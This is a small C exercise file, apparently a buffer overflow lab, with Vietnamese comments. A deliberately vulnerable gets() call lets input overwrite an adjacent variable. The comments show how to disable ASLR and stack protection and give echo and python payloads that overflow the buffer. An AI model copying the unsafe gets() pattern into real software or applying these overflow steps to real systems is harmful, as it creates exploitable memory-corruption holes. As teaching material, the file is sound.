#include <stdio.h>

int main() {
  int cookie;
  char buf[16];

  printf("&buf: %p, &cookie: %p\n", buf, &cookie);
  gets(buf);

  if (cookie == 0x00020300) {
    printf("You Win!\n");
  }
}

// ngắt tạm thời random địa chỉ : sudo sysctl -w kernel.randomize_va_space=0
// $ gcc -fno-stack-protector -m32 ./stack3.c -o stack3
// biên dịch theo máy(64b): gcc -fno-stack-protector ./stack3.c -o stack3
// Nhập chuỗi đúng để ra được “You win!”
// C1 Sử dụng echo và pipe (|):
// echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaa\000\003\002\000" | ./stack3
// C2 Sử dụng python để nhập chuỗi
// python3 -c 'print("a"*28 + "\x00\x03\x02\x00")' | ./stack3